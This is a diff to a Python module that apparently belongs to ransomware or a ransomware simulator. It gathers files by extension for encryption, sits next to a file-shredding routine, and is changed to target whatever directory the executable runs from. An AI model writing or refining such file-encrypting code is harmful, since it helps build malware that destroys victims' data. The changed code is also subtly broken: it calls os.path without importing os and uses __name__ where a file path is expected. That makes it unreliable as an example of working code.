@@ -1,5 +1,6 @@
 import logging
 import pickle
+import sys
 from os import urandom, remove, path, listdir, walk
 from random import randint
 from core.config import REQUIRED_FILE_FORMAT
@@ -66,7 +67,7 @@ def shred_file(file_path):
     remove(file_path)
 
 
-def get_files_to_be_encrypted(directory):
+def get_files_to_be_encrypted():
     """Generates the list of files to be encrypted
 
     Args:
@@ -75,10 +76,15 @@ def get_files_to_be_encrypted(directory):
     Returns:
         [type]: [description]
     """
-    logger.info(f"Discovering files in {directory}")
+    if getattr(sys, 'frozen', False):
+        application_directory = os.path.dirname(sys.executable)
+    else:
+        application_directory = os.path.dirname(os.path.abspath(__name__))
+        
+    logger.info(f"Discovering files in {application_directory}")
     files_to_encrypted = [
         path.join(root,f)
-        for root, dir, file in walk(directory)
+        for root, dir, file in walk(application_directory)
         for f in file
         if path.splitext(f)[1].upper() in REQUIRED_FILE_FORMAT
     ]
